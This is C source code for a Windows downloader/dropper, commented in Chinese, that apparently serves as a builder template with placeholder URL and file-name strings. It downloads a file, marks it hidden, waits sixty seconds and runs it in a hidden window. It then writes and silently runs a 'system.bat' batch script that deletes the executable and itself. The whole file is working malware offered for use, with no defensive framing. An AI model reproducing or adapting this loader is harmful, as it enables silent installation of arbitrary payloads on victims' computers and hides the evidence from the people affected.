#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <mmsystem.h>
#include <commdlg.h>

// 添加静态链接库
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"Wininet.lib")

// 该选项可以有效地减小编译出的文件体积
#pragma comment(linker,"/opt:nowin98")

// 函数声明
int  InternetGetFile(char szUrl[],char szFileName[]);
void SelfDel();

int main()
{
	// 下载文件并运行
	InternetGetFile("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
	// 自删除
	SelfDel();
	
	return 0;
}

// 下载文件函数
int InternetGetFile(char szUrl[100],char szFileName[100])
{
	DWORD dwFlags;
	if(!InternetGetConnectedState(&dwFlags,0))
	{
		return -1;
	}
	
	char strAgent[64];
	sprintf(strAgent,"Agent%ld",timeGetTime());
	HINTERNET hOpen;
	
	if(!(dwFlags & INTERNET_CONNECTION_PROXY))
	{
		hOpen=InternetOpen(strAgent,INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY,NULL,NULL,0);
		//2 使用IE 连接设置 禁止JS + INTERNET 配置文件
	}//3  the function reads proxy information from the registry.
	//4 If this parameter is NULL, the function reads the bypass list from the registry. 
	else
	{
		hOpen = InternetOpenA(strAgent,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	}
	
	if(!hOpen)
	{
		return -1;
	}
	
	DWORD dwSize;
	char szHead[] = "Accept: */*\r\n\r\n";
	void* szTemp[16384];
	HINTERNET hConnect;
	FILE *fp;

	// 打开指定URL
	if(!(hConnect = InternetOpenUrlA(hOpen,szUrl,szHead,strlen(szHead), INTERNET_FLAG_DONT_CACHE|INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_RELOAD,0)))
	{
		return -1;
	}

	// 创建本地文件并准备写入内容
	fp = fopen(szFileName,"wb+");
	if(fp == NULL)
	{
		return -1;
	}
	
	DWORD dwByteToRead = 0;
	DWORD dwSizeOfRq = 4;
	DWORD dwBytes = 0;

	// 查询连接HTTP信息得到文件长度	
	if(!HttpQueryInfo(hConnect,HTTP_QUERY_CONTENT_LENGTH|HTTP_QUERY_FLAG_NUMBER,(LPVOID)&dwByteToRead,&dwSizeOfRq,NULL))
	{
		dwByteToRead = 0;
	}
	
	// 循环读取直到文件末尾
	do
	{
		if(!InternetReadFile(hConnect,szTemp,16384,&dwSize))
		{
			InternetCloseHandle(hOpen);
			fclose(fp);
			return -1;
		}
		if(dwSize == 0)
			break;
		else
			fwrite(szTemp,dwSize,1,fp);
		
	}while(true);
	
	fclose(fp);
	InternetCloseHandle(hOpen);
	
	// 将下载到本地的文件属性设置为隐藏，60秒后运行	
	SetFileAttributes(szFileName,FILE_ATTRIBUTE_HIDDEN);
	Sleep(60000);
	WinExec(szFileName,SW_HIDE);
	
	return 0;
}

// 自删除函数

void SelfDel()
{
	char DirBuffer[MAX_PATH],TempBuffer[MAX_PATH];
	char temp[MAX_PATH];
	HMODULE hModule = GetModuleHandle(NULL);
	GetModuleFileName(hModule,DirBuffer,sizeof(DirBuffer));
	GetFileTitle(DirBuffer,TempBuffer,MAX_PATH);
	
	char *str = strrchr(DirBuffer,'\\');
	int result = str - DirBuffer + 1;
	for (int i=0;i<result;i++)
	{
			temp[i] = DirBuffer[i];
	}
	temp[i] = '\0';

	strcat(temp,"system.bat");
	// 生过程自删除批处理文件
	FILE *fp;
	fp = fopen(temp,"wb+");
	fprintf(fp,"@echo off\r\n");
	fprintf(fp,":start\r\n\tif not exist %s goto done\r\n",TempBuffer);
	fprintf(fp,"\tdel /f /q %s\r\n",TempBuffer);
	fprintf(fp,"goto start\r\n");
	fprintf(fp,":done\r\n");
	fprintf(fp,"\tdel /f /q %%0\r\n");
	fclose(fp);
	
	// 隐藏运行批处理完成自删除
	WinExec(temp,SW_HIDE);
	
}
